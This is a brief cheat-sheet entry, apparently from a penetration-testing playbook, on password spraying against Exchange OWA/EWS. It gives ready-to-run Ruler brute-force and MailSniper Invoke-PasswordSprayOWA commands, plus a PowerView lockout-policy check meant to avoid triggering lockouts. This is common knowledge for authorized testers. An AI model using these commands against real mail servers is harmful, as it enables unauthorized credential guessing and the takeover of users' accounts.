# 17.02 Exchange Password Spray Ruler Linux MailSniper Windows

> Spray Exchange OWA/EWS via `Ruler brute` (Autodiscover) from Linux or `Invoke-PasswordSprayOWA` from Windows — check lockout policy first.

## Overview

Spray discovered credentials against Exchange OWA/EWS from Linux using Ruler's brute mode (via Autodiscover) or from Windows using MailSniper's Invoke-PasswordSprayOWA. Check lockout policy with PowerView before spraying. Username list must use DOMAIN\Username format for MailSniper.

## Steps

- Use PowerView Get-DomainPolicy to read LockoutBadCount before spraying to avoid lockouts
- Ruler brute mode uses Autodiscover to validate credentials; requires --insecure for untrusted certs
- Ruler --users specifies the email list, --passwords the password list
- MailSniper Invoke-PasswordSprayOWA uses -ExchHostname, -UserList (DOMAIN\user format), -Password, -OutFile
- Invoke-PasswordSprayEWS is an alternative targeting the EWS endpoint

## Commands

### Check lockout policy

```powershell
(Get-DomainPolicy)."SystemAccess"
```

### Ruler password spray from Linux

```bash
./ruler-linux64 --domain <DOMAIN>.local --insecure brute --users global_address_list.txt --passwords passwords.txt --verbose -a 4
```

### MailSniper OWA spray (Windows)

```powershell
Invoke-PasswordSprayOWA -ExchHostname exch01.<DOMAIN>.local -UserList .\usernames.txt -Password "<PASS>" -OutFile creds.txt
```
